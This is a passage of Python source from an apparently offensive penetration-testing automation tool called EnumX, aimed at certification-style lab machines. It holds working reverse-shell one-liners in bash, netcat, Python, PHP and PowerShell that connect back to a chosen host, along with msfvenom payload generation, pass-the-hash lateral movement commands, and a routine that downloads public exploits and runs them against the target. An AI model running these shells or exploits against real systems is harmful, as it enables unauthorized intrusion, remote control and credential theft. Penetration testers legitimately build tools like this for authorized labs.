        report.add_finding(f"psexec → {lt}", "CRITICAL")

    if which("impacket-wmiexec") and ask("wmiexec?"):
        info(f"Run: impacket-wmiexec {u}:'{p}'@{lt}")
        report.add_finding(f"wmiexec → {lt}")

    if which("xfreerdp") and ask("RDP PTH (xfreerdp)?"):
        nt = nt_hash.split(":")[-1] if nt_hash and ":" in nt_hash else nt_hash
        if nt:
            info(f"Run: xfreerdp /v:{lt} /u:{u} /pth:{nt}")
        else:
            info(f"Run: xfreerdp /v:{lt} /u:{u} /p:'{p}'")
        report.add_finding(f"RDP → {lt}")

# ════════════════════════════════ SHELL GENERATION ═════════════════════════════
async def gen_shells(lhost: str, out_dir: Path, report: Report):
    section("Shell & Payload Generation")
    shell_dir = out_dir / "shells"
    shell_dir.mkdir(parents=True, exist_ok=True)
    lport = prompt("Listen port", "4444")

    shells = {
        "bash_tcp":    f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'",
        "bash_mkfifo": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
        "python3":     f"python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{lhost}\",{lport}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/bash\")'",
        "php":         f"php -r '$s=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "powershell":  f"powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length))-ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)}}\"",
        "nc_mkfifo":   f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc {lhost} {lport} >/tmp/f",
    }
    shell_file = shell_dir / "reverse_shells.txt"
    shell_file.write_text("\n".join(f"# {k}\n{v}\n" for k, v in shells.items()), encoding="utf-8")
    print()
    for k, v in shells.items():
        print(f"  {c(CYAN, k):30s} {v[:80]}...")

    if which("msfvenom") and ask("Generate msfvenom payloads?"):
        payloads = [
            ("linux_x64_elf", "linux/x64/shell_reverse_tcp",       "elf",     "payload.elf"),
            ("win_x64_exe",   "windows/x64/shell_reverse_tcp",     "exe",     "payload.exe"),
            ("php_shell",     "php/reverse_php",                   "raw",     "payload.php"),
            ("aspx_shell",    "windows/x64/shell_reverse_tcp",     "aspx",    "payload.aspx"),
        ]
        tasks = []
        for name, pl, fmt, fname in payloads:
            if ask(f"Generate {name}?"):
                tasks.append(run_cmd(
                    ["msfvenom", "-p", pl, f"LHOST={lhost}", f"LPORT={lport}",
                     "-f", fmt, "-o", str(shell_dir / fname)],
                ))
                report.add_finding(f"msfvenom {name}")
        if tasks:
            await asyncio.gather(*tasks)

    info(f"Start listener: rlwrap nc -lvnp {lport}")
    report.add_finding(f"Shells generated {lhost}:{lport}")

# ══════════════════════════════ SEARCHSPLOIT + AUTO-EXPLOIT ════════════════════
async def run_searchsploit(services: List[Service], out_dir: Path, report: Report):
    section("Searchsploit & Auto-Exploit")
    if not which("searchsploit"):
        warn("searchsploit not found")
        return
    ss_dir = out_dir / "searchsploit"
    ss_dir.mkdir(parents=True, exist_ok=True)

    for s in services:
        if not ask(f"Searchsploit {s.port}/{s.proto} {s.label()}?"):
            continue
        terms = [t for t in [s.product, s.version] if t] or [s.name]
        query = " ".join(terms)
        out_f = ss_dir / f"{s.port}_{s.name.replace('/','_')}.txt"
        rc, out = await run_cmd(["searchsploit", query], stdout_file=out_f)
        report.add_finding(f"searchsploit: '{query}' port {s.port}")

        # Parse EDB IDs from output
        edb_ids = re.findall(r"\|\s+(\d+)\s*$", out, re.MULTILINE)
        if not edb_ids:
            edb_ids = re.findall(r"exploits/\S+/(\d+)\b", out)

        if edb_ids:
            found(f"Found {len(edb_ids)} possible exploit(s): {edb_ids[:5]}")
            for edb_id in edb_ids[:5]:
                if ask(f"Auto-pull exploit EDB-{edb_id} and attempt? (review before running)"):
                    exploit_dir = ss_dir / f"exploit_{edb_id}"
                    exploit_dir.mkdir(exist_ok=True)
                    rc2, out2 = await run_cmd(
                        ["searchsploit", "-m", edb_id, "--dest", str(exploit_dir)],
                    )
                    pulled = list(exploit_dir.iterdir())
                    if pulled:
                        exploit_path = pulled[0]
                        info(f"Exploit pulled: {exploit_path}")
                        info(f"Review it: cat {exploit_path}")
                        ext = exploit_path.suffix.lower()
                        if ask(f"Attempt to run {exploit_path.name}?"):
                            if ext == ".py":
                                await run_cmd(["python3", str(exploit_path)],
                                               stdout_file=exploit_dir / "run_out.txt")
                            elif ext == ".sh":
                                await run_cmd(["bash", str(exploit_path)],
                                               stdout_file=exploit_dir / "run_out.txt")
                            elif ext == ".rb":
                                await run_cmd(["ruby", str(exploit_path)],
                                               stdout_file=exploit_dir / "run_out.txt")
                            else:
                                warn(f"Unknown extension {ext} – review and run manually")
                            report.add_finding(f"Exploit EDB-{edb_id} attempted", "CRITICAL")
                    else:
                        warn(f"Could not pull EDB-{edb_id}")

# ══════════════════════════════════ ARGPARSE ═══════════════════════════════════
def parse_args():
    global NO_COLOR
    pre = argparse.ArgumentParser(add_help=False)
    pre.add_argument("--no-color", action="store_true")
    pre.add_argument("-h", "--help", action="store_true")
    pre_args, _ = pre.parse_known_args()
    NO_COLOR = pre_args.no_color

    p = argparse.ArgumentParser(description="EnumX v4 – CPTS Automation", add_help=False)
    p.add_argument("--no-color",  action="store_true")
    p.add_argument("--target",    required=False)
    p.add_argument("--skip-nmap", action="store_true")
    p.add_argument("--nmap-xml",  type=Path, default=None)
    p.add_argument("--creds",     type=Path, default=None)
    p.add_argument("--userlist",  type=Path, default=None)
    p.add_argument("--passlist",  type=Path, default=None)
    p.add_argument("--domain",    default="")
    p.add_argument("--dc-ip",     default="")
    p.add_argument("--lhost",     default="")
    p.add_argument("-h", "--help", action="store_true")

    if pre_args.help:
        print_banner()
        p.print_help()
        sys.exit(0)

    args = p.parse_args()
    print_banner()
    if not args.target:
        p.error("--target is required")
    return args

# ══════════════════════════════════ MAIN ═══════════════════════════════════════
async def main_core():
    global SESSION_LOG
    args = parse_args()

    ts       = dt.datetime.now().strftime("%Y%m%d-%H%M%S")
    base_out = Path("enumx_out") / args.target / ts
    base_out.mkdir(parents=True, exist_ok=True)

    SESSION_LOG = SessionLogger(base_out / "session_log.txt")
    info(f"Session log: {base_out}/session_log.txt")

    creds = CredManager.from_file(args.creds) if args.creds else CredManager()
    if args.userlist: creds.userlist = args.userlist
    if args.passlist: creds.passlist = args.passlist
    if args.domain:   creds.domain   = args.domain
    if args.dc_ip:    creds.dc_ip    = args.dc_ip

    report = Report(args.target, base_out)

    # ── Nmap ──────────────────────────────────────────────────────────────────
    xml_path = args.nmap_xml
    if not args.skip_nmap:
        xml_path = await run_nmap(args.target, base_out)
        if xml_path is None:
            error("Nmap failed – aborting")
            return
    else:
        if not xml_path or not xml_path.exists():
            error("--skip-nmap requires --nmap-xml")
            return

    services = parse_nmap_xml(xml_path)
    udp_xml = base_out / "udp.xml"
    if udp_xml.exists():
        udp_services = parse_nmap_xml(udp_xml)
        existing = {s.port for s in services}
        for s in udp_services:
            if s.port not in existing:
                services.append(s)
        if udp_services:
            info(f"Merged {len(udp_services)} UDP service(s) into results")

    if not services:
        error("No open services found")
        return

    section("Detected Open Services")
    for s in services:
        print(f"  {c(GREEN,str(s.port))}/{s.proto}  {c(YELLOW,s.name)}  "
              f"{s.product or ''}  {s.version or ''}")

    report.add_section("Nmap Scan",
                       "\n".join(f"- {s.port}/{s.proto}  {s.label()}" for s in services))

    # ── Machine Profile ───────────────────────────────────────────────────────
    profile = profile_machine(services)
    report.machine_type = profile.machine_type
    print_profile(profile)
    report.add_section("Machine Profile",
                       f"**Type:** {profile.machine_type}\n\n"
                       f"**HTB Hints:**\n" +
                       "\n".join(f"- {h}" for h in profile.htb_hints) +
                       "\n\n**Attack Path:**\n" +
                       "\n".join(f"- {s}" for s in profile.attack_path))

    # ── Classify ports ────────────────────────────────────────────────────────
    ports     = {s.port for s in services}
    http_ports  = [s.port for s in services
                   if s.name.startswith("http") or s.port in (80,443,8080,8443,8000,8888)]
    smb_present = any(s.port in (139,445) or "smb" in s.name.lower() for s in services)
    ftp_ports   = [s.port for s in services if "ftp" in s.name.lower() or s.port == 21]
    ssh_ports   = [s.port for s in services if "ssh" in s.name.lower() or s.port == 22]
    ldap_ports  = [s.port for s in services
                   if "ldap" in s.name.lower() or s.port in (389,636,3268,3269)]
    rdp_ports   = [s.port for s in services if "ms-wbt" in s.name.lower() or s.port == 3389]
    snmp_ports  = [s.port for s in services if "snmp" in s.name.lower() or s.port in (161,162)]
    db_svcs     = [s for s in services
                   if s.port in (3306,1433,5432)
                   or any(x in s.name.lower() for x in ("mysql","ms-sql","mssql","postgresql"))]
    is_ad       = any(s.port in (88,389,636,3268,445) for s in services)

    # ── Interactive dispatch ──────────────────────────────────────────────────
    if ask("Extra recon (WAF/DNS/VHOST/CRT.sh)?"):
        await recon_extras(args.target, base_out, report)

    if http_ports and ask(f"Web attacks on {http_ports}?"):
        await enum_http(args.target, http_ports, base_out, report)

    if smb_present and ask("SMB attacks?"):
        await enum_smb(args.target, base_out, creds, report)

    if ftp_ports and ask(f"FTP attacks on {ftp_ports}?"):
        await enum_ftp(args.target, ftp_ports, base_out, creds, report)

    if ssh_ports and ask(f"SSH attacks on {ssh_ports}?"):
        await enum_ssh(args.target, ssh_ports, base_out, creds, report)

    if ldap_ports and ask(f"LDAP enumeration on {ldap_ports}?"):
        await enum_ldap(args.target, ldap_ports, base_out, report)

    if rdp_ports and ask(f"RDP attacks on {rdp_ports}?"):
        await enum_rdp(args.target, rdp_ports, base_out, creds, report)

    if snmp_ports and ask(f"SNMP enumeration on {snmp_ports}?"):
        await enum_snmp(args.target, snmp_ports, base_out, creds, report)

    if db_svcs and ask("Database attacks?"):
        await enum_db(args.target, db_svcs, base_out, creds, report)

    if is_ad and ask("Active Directory attacks?"):
        await enum_ad(args.target, base_out, creds, report)

    if ask("Credential attacks (hashcat/john/Responder/CeWL)?"):
        await cred_attacks(args.target, base_out, creds, report)

    if ask("Post-exploitation – Linux (linpeas/LES)?"):
        await post_exploit_linux(args.target, base_out, creds, report)

    if ask("Post-exploitation – Windows (winpeas/dump parsing)?"):
        await post_exploit_windows(args.target, base_out, creds, report)

    if ask("Lateral movement?"):
        await lateral_movement(args.target, base_out, creds, report)

    lhost = args.lhost or prompt("Your IP for shell generation (Enter to skip)", "")
    if lhost:
        await gen_shells(lhost, base_out, report)

    if ask("Searchsploit + auto-exploit on detected services?"):
        await run_searchsploit(services, base_out, report)

    # ── Final summary ─────────────────────────────────────────────────────────
    report.save()

    section("Session Complete")
    PANEL.print()
    info(f"Output dir  : {base_out}")
    info(f"Session log : {base_out}/session_log.txt")
    info(f"HTML report : {base_out}/report.html")
    info(f"Writeup     : {base_out}/writeup_skeleton.md")
    if report.creds_found:
        print(c(RED, f"\n  💀 Credentials captured ({len(report.creds_found)}):"))
        for cr in report.creds_found:
            print(c(RED, f"     {cr}"))

if __name__ == "__main__":
    try:
        asyncio.run(main_core())
    except KeyboardInterrupt:
        error("Interrupted")
        if SESSION_LOG:
            info(f"Session log saved: {SESSION_LOG.log_file}")
